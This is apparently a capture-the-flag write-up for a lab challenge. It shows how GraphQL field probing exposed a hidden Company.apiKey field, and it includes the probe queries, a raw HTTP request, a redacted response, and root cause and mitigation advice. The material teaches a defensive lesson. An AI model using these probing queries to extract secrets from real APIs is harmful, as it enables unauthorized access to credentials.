---
title: "Hidden GraphQL Field Leads to API Key Disclosure | BuggedUp"
date: 2026-08-02 13:15:00 +0530
categories: [A01 - Broken Access Control, Information Disclosure]
tags: [graphql, broken-access-control, information-disclosure, api-key-disclosure, hidden-field, webverse]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/buggedup-graphql-sensitive-field-disclosure.webp
  alt: "BuggedUp GraphQL hidden field API key disclosure"
---

## Lab Link

[BuggedUp](https://dashboard.webverselabs-pro.com/mystery-challenges/buggedup)

---

## Overview

**BuggedUp** was a WebVerse challenge built around a bug bounty program directory. The public UI displayed a list of bounty programs and company details, but the actual data was loaded from a GraphQL endpoint.

The main issue was not SQL injection or authentication bypass. Instead, the GraphQL API exposed a sensitive backend field that the frontend did not request. By probing the available object fields, I discovered that the `Company` object contained an `apiKey` field. Querying that hidden field leaked a company API key, and one of those exposed keys contained the challenge flag.

## Vulnerability Identification

After opening the application, the visible page showed a bug bounty program directory with multiple programs. No flag was directly visible in the UI.

The interesting part was the client-side behavior. The page loaded its program data from a single JavaScript file and communicated with the backend through:

```text
/graphql
```

The frontend requested only normal public fields, but GraphQL often exposes more fields than the UI uses. This made the API schema and object fields the main attack surface.

## Recon and Approach

The first step was to inspect the application assets and identify how data was loaded.

The public script showed that the app used GraphQL queries for program data. A basic GraphQL probe confirmed that the endpoint accepted JSON GraphQL requests:

```graphql
{
  __typename
}
```

The server responded as a GraphQL endpoint, so the next step was schema discovery.

## GraphQL Introspection Check

A standard introspection query was attempted:

```graphql
query IntrospectionProbe {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      name
    }
  }
}
```

## Mapping the Public Query Surface

By testing likely root fields, the API appeared to expose public program queries such as:

```graphql
query {
  programs {
    name
  }
}
```

and a single-program lookup pattern similar to:

```graphql
query {
  program(handle: "example") {
    name
  }
}
```

The important observation was that the root query surface looked intentionally limited, but the nested object fields were still worth testing.

## Hidden Field Discovery

The frontend requested only public company fields, but field-name probing revealed that the nested `Company` object exposed a sensitive field:

```text
Company.apiKey
```

This field was not shown in the UI, but it was still queryable through GraphQL.

A focused query was used to request the hidden field across all programs:

```graphql
query HiddenFieldProbe {
  programs {
    company {
      apiKey
    }
  }
}
```

The backend returned API key values for the listed companies. One of the exposed values belonged to **Tideline Health** and contained the WebVerse flag.

## Exploitation

A simplified request looked like this:

```http
POST /graphql HTTP/2
Host: redacted
Content-Type: application/json

{
  "query": "query HiddenFieldProbe { programs { company { apiKey } } }"
}
```

The response included sensitive company API keys:

```json
{
  "data": {
    "programs": [
      {
        "company": {
          "apiKey": "WEBVERSE{REDACTED}"
        }
      }
    ]
  }
}
```

This confirmed that the backend allowed unauthenticated access to a sensitive internal field.

## Proof and Flag

The flag was obtained from the leaked `Company.apiKey` value.

```text
WEBVERSE{REDACTED}
```

The solve path was:

```text
Public UI
→ static JavaScript review
→ /graphql endpoint discovery
→ introspection blocked
→ GraphQL validation and field probing
→ hidden Company.apiKey field
→ exposed API key containing the flag
```

## Root Cause

The root cause was missing field-level authorization in the GraphQL API.

The application likely assumed that because the frontend did not request `apiKey`, users would not access it. That is not a valid security boundary. GraphQL clients can request any field that the schema exposes unless the backend explicitly restricts access.

## Impact

An unauthenticated attacker could query internal company API keys through the public GraphQL endpoint.

The impact included:

- Disclosure of sensitive API keys
- Exposure of internal company data
- Possible access to downstream services if the leaked keys were valid outside the challenge
- Direct flag disclosure in the CTF context

## Mitigation

To fix this issue:

1. Enforce field-level authorization for sensitive GraphQL fields.
2. Remove secrets such as API keys from public object types.
3. Split public and internal GraphQL schemas where possible.
4. Avoid returning sensitive fields unless the requester is authenticated and authorized.
5. Add automated tests to verify that public users cannot query secret fields.
6. Keep introspection disabled in production if appropriate, but do not rely on that as the only control.
7. Monitor GraphQL validation errors to ensure they do not leak excessive schema hints.

